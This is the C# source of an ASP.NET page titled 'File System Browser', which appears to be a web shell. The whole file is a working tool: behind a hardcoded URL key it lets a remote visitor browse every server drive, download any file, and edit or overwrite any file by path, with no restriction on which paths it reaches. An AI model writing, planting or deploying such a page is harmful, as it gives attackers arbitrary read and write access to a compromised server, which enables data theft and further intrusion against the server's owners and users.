<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script language="c#" runat="server">
    private const string AUTHKEY = "woanware";
    private const string HEADER = "<html>\n<head>\n<title>File System Browser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Request.Params["authkey"] == null || Request.Params["authkey"] != AUTHKEY)
            {
                Response.Write(HEADER);
                Response.Write("Unauthorized access");
                Response.Write(FOOTER);
                return;
            }

            if (Request.Params["operation"] != null)
            {
                if (Request.Params["operation"] == "download")
                {
                    Response.Write(HEADER);
                    Response.Write(this.DownloadFile());
                    Response.Write(FOOTER);
                }
                else if (Request.Params["operation"] == "list")
                {
                    Response.Write(HEADER);
                    Response.Write(this.OutputList());
                    Response.Write(FOOTER);
                }
                else if (Request.Params["operation"] == "edit")
                {
                    Response.Write(HEADER);
                    Response.Write(this.EditFile());
                    Response.Write(FOOTER);
                }
                else if (Request.Params["operation"] == "save")
                {
                    Response.Write(HEADER);
                    Response.Write(this.SaveFile());
                    Response.Write(FOOTER);
                }
                else
                {
                    Response.Write(HEADER);
                    Response.Write("Unknown operation");
                    Response.Write(FOOTER);
                }
            }
            else
            {
                Response.Write(HEADER);
                Response.Write(this.OutputList());
                Response.Write(FOOTER);
            }
        }
        catch (Exception ex)
        {
            Response.Write(HEADER);
            Response.Write(ex.Message);
            Response.Write(FOOTER);
        }
    }

    private string DownloadFile()
    {
        try
        {
            if (Request.Params["file"] == null)
            {
                return "No file supplied";
            }

            string file = Request.Params["file"];

            if (File.Exists(file) == false)
            {
                return "File does not exist";
            }

            Response.ClearContent();
            Response.ClearHeaders();
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(file));
            Response.AddHeader("Content-Length", new FileInfo(file).Length.ToString());
            Response.WriteFile(file);
            Response.Flush();
            Response.Close();

            return "File downloaded";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    private string OutputList()
    {
        try
        {
            StringBuilder response = new StringBuilder();

            string dir = string.Empty;

            if (Request.Params["directory"] == null)
            {
                string[] tempDrives = Environment.GetLogicalDrives();
                if (tempDrives.Length > 0)
                {
                    for (int index = 0; index < tempDrives.Length; index++)
                    {
                        try
                        {
                            dir = tempDrives[index];
                            break;
                        }
                        catch (IOException){}
                    }
                }
            }
            else
            {
                dir = Request.Params["directory"];
            }

            if (Directory.Exists(dir) == false)
            {
                return "Directory does not exist";
            }

            // Output the auth key textbox
            response.Append("<table><tr>");
            response.Append(@"<td><asp:TextBox id=""txtAuthKey"" runat=""server""></asp:TextBox></td>");
            response.Append("</tr><tr><td>&nbsp;<td></tr></table>");

            // Output the available drives
            response.Append("<table><tr>");
            response.Append("<td>Drives</td>");

            string[] drives = Environment.GetLogicalDrives();
            foreach (string drive in drives)
            {
                response.Append("<td><a href=");
                response.Append("?directory=");
                response.Append(drive);
                response.Append("&authkey=" + Request.Params["authkey"]);
                response.Append("&operation=list>");
                response.Append(drive);
                response.Append("</a></td>");
            }

            // Output the current path
            response.Append("</tr></table><table><tr><td>&nbsp;</td></tr>");
            response.Append("<tr><td>..&nbsp;&nbsp;&nbsp;<a href=\"?directory=");

            string parent = dir;
            DirectoryInfo parentDirInfo = Directory.GetParent(dir);
            if (parentDirInfo != null)
            {
                parent = parentDirInfo.FullName;
            }

            response.Append(parent);
            response.Append("&authkey=" + Request.Params["authkey"]);
            response.Append("&operation=list\">");
            response.Append(parent);
            response.Append("</a></td></tr></table><table>");

            // Output the directories
            System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(dir);
            foreach (System.IO.DirectoryInfo dirs in dirInfo.GetDirectories("*.*"))
            {
                response.Append("<tr><td>dir&nbsp;&nbsp;<a href=\"?directory=" + dirs.FullName + "&authkey=" + Request.Params["authkey"] + "&operation=list\">" + dirs.FullName + "</a></td></tr>");
            }

            // Output the files
            dirInfo = new System.IO.DirectoryInfo(dir);
            foreach (System.IO.FileInfo fileInfo in dirInfo.GetFiles("*.*"))
            {
                response.Append("<tr><td>file&nbsp;<a href=\"?file=" + fileInfo.FullName + "&authkey=" + Request.Params["authkey"] + "&operation=download\">" + fileInfo.FullName + "</a></td>");
                response.Append("<td><a href=\"?file=" + fileInfo.FullName + "&authkey=" + Request.Params["authkey"] + "&operation=edit\">Edit</a></td></tr>");
            }

            response.Append("</table>");

            return response.ToString();
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    private string EditFile()
    {
        try
        {
            if (Request.Params["file"] == null)
            {
                return "No file supplied";
            }

            string file = Request.Params["file"];

            if (File.Exists(file) == false)
            {
                return "File does not exist";
            }

            // Read the file content
            string content = File.ReadAllText(file);

            // Generate HTML form for editing
            StringBuilder response = new StringBuilder();
            response.Append("<form method=\"post\" action=\"?file=" + file + "&authkey=" + Request.Params["authkey"] + "&operation=save\">");
            response.Append("<textarea name=\"fileContent\" rows=\"20\" cols=\"80\">");
            response.Append(HttpUtility.HtmlEncode(content)); // Encode content to avoid HTML injection
            response.Append("</textarea><br/>");
            response.Append("<input type=\"submit\" value=\"Save Changes\" />");
            response.Append("</form>");

            return response.ToString();
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    private string SaveFile()
    {
        try
        {
            if (Request.Params["file"] == null || Request.Params["fileContent"] == null)
            {
                return "No file or content supplied";
            }

            string file = Request.Params["file"];

            // Write the edited content back to the file
            File.WriteAllText(file, Request.Params["fileContent"]);

            return "File saved successfully";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>
